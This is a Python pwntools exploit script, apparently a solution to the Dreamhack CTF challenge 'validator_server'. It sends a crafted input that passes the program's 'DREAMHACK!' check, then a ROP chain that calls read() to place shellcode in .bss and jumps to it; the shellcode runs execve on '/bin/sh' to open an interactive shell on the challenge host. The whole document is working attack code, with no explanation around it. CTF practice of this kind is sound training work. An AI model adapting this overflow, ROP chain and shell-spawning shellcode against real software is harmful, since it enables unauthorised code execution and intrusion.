#!/usr/bin/env python3
from pwn import *

PORT = 9081
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./validator_server', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x400677
        	b*0x0000000000400635
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()

pl = b"DREAMHACK!"
pl += bytes(range(118, -1, -1))

sc = asm('''
	xor rax, rax
	mov rax, 29400045130965551
	push rax
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 0x3b
	syscall
	''', arch = 'amd64')

pop_rdi = 0x004006f3
pop_rsi_r15 = 0x004006f1
pop_rdx = 0x0040057b
bss = exe.bss()

pl += flat(
	b'B'*7,
	pop_rdi, 0,
	pop_rsi_r15, bss, 0,
	pop_rdx, len(sc)+1,
	exe.plt.read,
	bss
	)
p.send(pl)
p.send(sc)

p.interactive()